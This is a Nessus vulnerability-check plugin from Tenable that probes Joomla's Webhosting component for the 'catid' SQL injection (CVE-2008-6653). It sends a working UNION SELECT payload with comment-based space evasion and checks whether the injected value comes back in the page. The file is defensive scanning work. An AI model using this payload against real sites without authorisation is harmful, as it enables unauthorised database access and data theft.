#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(32124);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-6653");
  script_bugtraq_id(29000);
  script_xref(name:"milw0rm", value:"5527");
  script_xref(name:"OSVDB", value:"50423");

  script_name(english:"Webhosting Component for Joomla catid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate category overview output");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of the Webhosting component for Joomla installed on the
remote host fails to sanitize user-supplied input to the 'catid'
parameter before using it in a database query in the function
'show_overview()' in 'webhosting.php'.  Regardless of PHP's
'magic_quotes_gpc' setting, an attacker may be able to exploit this
issue to manipulate database queries, leading to disclosure of
sensitive information, execution of arbitrary code, or attacks against
the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to manipulate a category overview.
  magic = unixtime();
  exploit = string("99999 UNION SELECT ", magic, ",2,3--");

  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "option=com_webhosting&",
      "catid=", str_replace(find:" ", replace:"/**/", string:exploit)
    ), 
    port:port
  );
  if (isnull(w)) exit(0);
  res = w[2];

  # There's a problem if we could manipulate the overview.
  if (string('option=com_webhosting&task=details&id=', magic, '&Itemid=') >< res)
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
